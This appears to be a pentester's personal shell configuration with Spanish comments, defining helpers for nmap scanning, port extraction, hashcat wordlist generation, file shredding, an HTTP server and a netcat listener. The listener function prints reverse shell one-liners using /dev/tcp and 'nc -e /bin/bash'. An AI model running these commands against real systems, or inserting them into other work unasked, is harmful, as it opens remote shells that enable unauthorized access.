# FUNCIONES PERSONALIZADAS Y PENTESTING
# ═══════════════════════════════════════════════════════════════════════════

function settarget(){
    local target="$1"
    echo "$target" > ~/.config/scripts/target 2>/dev/null || echo "$target" > "/home/${SUDO_USER:-$USER}/.config/scripts/target" 2>/dev/null
}

function cleartarget(){
    echo '' > ~/.config/scripts/target 2>/dev/null || echo '' > "/home/${SUDO_USER:-$USER}/.config/scripts/target" 2>/dev/null
}

function extractPorts(){
    [ -z "$1" ] && { echo "Uso: extractPorts <archivo_allPorts>"; return 1; }
    local ports ip_address
    ports="$(grep -oP '\d{1,5}/open' "$1" | awk -F'/' '{print $1}' | paste -sd, -)"
    ip_address="$(grep -oP '\d{1,3}(\.\d{1,3}){3}' "$1" | sort -u | head -n 1)"
    
    echo -e "\n[*] Extracting information...\n"
    echo -e "\t[*] IP Address: $ip_address"
    echo -e "\t[*] Open ports: $ports\n"
    echo -n "$ports" | xclip -sel clip
    echo -e "[*] Ports copied to clipboard\n"
}

function rmk(){
    scrub -p dod "$1" && shred -zun 10 -v "$1"
}

function mkt(){
    mkdir -p {discovery,content,exploits,scripts}
}

function c() {
    for i in {1..50}; do echo ""; sleep 0.002; done
    clear
}

function mkcd() {
    mkdir -p "$1" && cd "$1"
}

function cpy() {
    "$@" | xclip -selection clipboard && echo "✓ Output copiado al clipboard"
}

function cpf() {
    cat "$1" | xclip -selection clipboard && echo "✓ Contenido de '$1' copiado al clipboard"
}

function hf() {
    local cmd=$(history | fzf --tac --no-sort | sed 's/^[ ]*[0-9]*[ ]*//')
    [ -n "$cmd" ] && print -z "$cmd"
}

function vf() {
    local file=$(find . -type f 2>/dev/null | fzf --preview 'batcat --color=always --style=numbers --line-range=:500 {}')
    [ -n "$file" ] && nvim "$file"
}

function cdf() {
    local dir=$(find . -type d 2>/dev/null | fzf --preview 'lsd -la {}')
    [ -n "$dir" ] && cd "$dir"
}

function ports() {
    if [ -z "$1" ]; then
        ss -tulnp | grep LISTEN
    else
        ss -tulnp | grep ":$1"
    fi
}

function qscan() {
    [ -z "$1" ] && { echo "Uso: qscan <IP>"; return 1; }
    echo -e "\033[1;33m[*] Quick scan en $1...\033[0m"
    nmap -sC -sV -T4 "$1" -oN "qscan_$1.txt"
    echo -e "\033[1;32m[+] Resultados guardados en qscan_$1.txt\033[0m"
}

function fullscan() {
    [ -z "$1" ] && { echo "Uso: fullscan <IP>"; return 1; }
    echo -e "\033[1;33m[*] Full port scan en $1...\033[0m"
    nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn "$1" -oG "allPorts_$1"
    extractPorts "allPorts_$1"
}

function isalive() {
    [ -z "$1" ] && { echo "Uso: isalive <IP>"; return 1; }
    ping -c 1 -W 1 "$1" > /dev/null 2>&1 && echo -e "\033[1;32m[+] $1 está vivo\033[0m" || echo -e "\033[1;31m[-] $1 no responde\033[0m"
}

function genwordlist() {
    [ -z "$1" ] && { echo "Uso: genwordlist <palabra_base> [longitud_min] [longitud_max]"; return 1; }
    local base="$1"
    local min="${2:-4}"
    local max="${3:-10}"
    echo -e "\033[1;33m[*] Generando wordlist basada en '$base'...\033[0m"
    hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule <<< "$base" 2>/dev/null | sort -u > "wordlist_${base}.txt"
    echo -e "\033[1;32m[+] Wordlist guardada en wordlist_${base}.txt\033[0m"
}

function serve() {
    local port="${1:-8000}"
    local ip=$(hostname -I | awk '{print $1}')
    echo -e "\033[1;32m[+] Servidor HTTP iniciado en:\033[0m"
    echo -e "    \033[1;36mhttp://$ip:$port\033[0m"
    echo -e "    \033[1;36mhttp://localhost:$port\033[0m"
    python3 -m http.server "$port"
}

function listener() {
    local port="${1:-4444}"
    echo -e "\033[1;33m[*] Iniciando listener en puerto $port...\033[0m"
    echo -e "\033[1;36m[i] Reverse shells:\033[0m"
    echo -e "    bash -i >& /dev/tcp/$(hostname -I | awk '{print $1}')/$port 0>&1"
    echo -e "    nc -e /bin/bash $(hostname -I | awk '{print $1}') $port\n"
    nc -lvnp "$port"
}

function sploit() {
    [ -z "$1" ] && { echo "Uso: sploit <término>"; return 1; }
    searchsploit "$@"
}

# Auto-ls al cambiar de directorio
function chpwd() {
    emulate -L zsh
    lsd -lh --group-dirs=first
}

